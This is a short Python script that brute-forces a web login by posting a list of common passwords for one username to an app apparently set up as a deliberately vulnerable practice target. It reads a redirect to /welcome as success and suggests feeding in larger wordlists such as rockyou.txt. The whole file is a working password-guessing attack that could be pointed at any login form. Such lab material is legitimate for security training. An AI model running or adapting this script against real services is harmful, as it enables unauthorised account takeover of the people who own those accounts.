import requests

url = "https://vuln-app-cc-1.onrender.com/login"
username = "zalaid"

passwords = [
    "password", "1", "zalaid123", "admin123", "letmein",
    "welcome", "monkey", "dragon", "master", "sunshine",
    "princess", "qwerty", "admin", "test", "1234567"
]

print(f"Brute forcing username: {username}")
print(f"Testing {len(passwords)} passwords..\n")

found = None
for password in passwords:
    response = requests.post(
        url,
        data={"username": username, "password": password},
        allow_redirects=False
    )

    # A successful login redirects (302) to /welcome.
    # A failed login returns 401 with a JSON error.
    location = response.headers.get("location", "")
    success = response.is_redirect and "/welcome" in location

    if success:
        print(f"SUCCESS! Password found: {password}")
        print(f"Login at: {url}")
        found = password
        break
    else:
        print(f"Failed: {password:<12} (status {response.status_code})")

if not found:
    print("\nNo password in the list worked.")
    print("The correct password is simply not in this wordlist — add it and re-run,")
    print("or feed in a larger list (e.g. rockyou.txt).")
